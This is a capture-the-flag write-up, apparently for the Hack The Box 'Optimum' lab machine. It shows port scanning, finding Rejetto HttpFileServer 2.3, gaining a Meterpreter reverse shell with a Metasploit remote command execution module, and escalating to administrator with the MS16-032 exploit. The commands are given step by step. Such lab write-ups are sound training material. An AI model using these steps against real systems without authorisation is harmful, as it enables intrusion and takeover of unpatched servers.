# Optimum

Date: 2024/06/23

## Enumeration
### Port Scanning

First, I performed a comprehensive port scan to identify open ports and services running on the target machine:

```bash
nmap -sS -p- <IP> -v -oN full_tcp_ports.txt
```

This scan revealed a single open port:

```
PORT   STATE SERVICE
80/tcp open  http
```

Next, I conducted a detailed version and script scan to gather more information about the service running on port 80:

```bash
nmap -sV -sC -p80 <IP> -oN ports.txt -oX ports.xml
```

The output provided specific details:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

### Port 80 Analysis

Upon opening the service in a web browser, I observed the service versione, it is "HttpFileServer 2.3".

I searched for known vulnerabilities related to "HttpFileServer 2.3":

```bash
searchsploit HttpFileServer 2.3
```

The search revealed a remote command execution exploit:

```
-------------------------------------------------------------------------------
 Exploit Title                                                                 |  Path
-------------------------------------------------------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                    | windows/webapps/49125.py
-------------------------------------------------------------------------------
```

Additionally, I checked for available exploits in Metasploit:

```bash
msf6 > search HttpFileServer 2.3
```

I found a relevant module:

```
Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

## Exploitation

Using Metasploit, I selected the identified module and configured the necessary options:

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOST <IP>
set LHOST <Your_IP>
run
```

Successfully exploited, I gained a shell as the kostas user and retrieved the user flag.
OS information:

```bash
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

## Privilege Escalation

To identify potential privilege escalation paths, I ran:

```bash
post/multi/recon/local_exploit_suggester
```

The module suggested several exploits:

```
1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
5   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

I got a privilege user only with the the ms16_032_secondary_logon_handle_privesc module :

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <session_id>
run
```

Successfully, I gained administrative privileges and accessed the root flag.

***

This README now provides a clear, step-by-step guide for enumerating, exploiting, and escalating privileges on the Optimum machine, complete with detailed explanations for each step.
